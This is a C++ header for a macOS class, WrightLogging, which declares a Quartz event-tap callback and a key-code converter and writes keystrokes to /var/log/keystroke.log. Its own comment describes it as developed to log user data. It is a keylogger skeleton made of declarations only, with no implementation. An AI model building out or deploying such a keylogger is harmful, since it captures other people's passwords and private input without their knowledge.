//
//  WrightLogging.hpp
//  WrightFramework
//
//  Created by william wright on 2/18/19.
//  Copyright © 2019 Silvertap. All rights reserved.
//  Developed To Log User Data

#ifndef WrightLogging_hpp
#define WrightLogging_hpp
#include <stdio.h>
#include <fcntl.h>   // open
#include <stdlib.h>
#include <string.h>  // strerror
#include <errno.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>  // daemon, close
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
//https://developer.apple.com/library/mac/documentation/Carbon/Reference/QuartzEventServicesRef/Reference/reference.html
#endif /* WrightLogging_hpp */
class WrightLogging{
public:
    const char *convertKeyCode(int keyCode);
    CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
    void StartLogging();
private:
    FILE *logfile = NULL;
    const char *logfileLocation = "/var/log/keystroke.log";
};
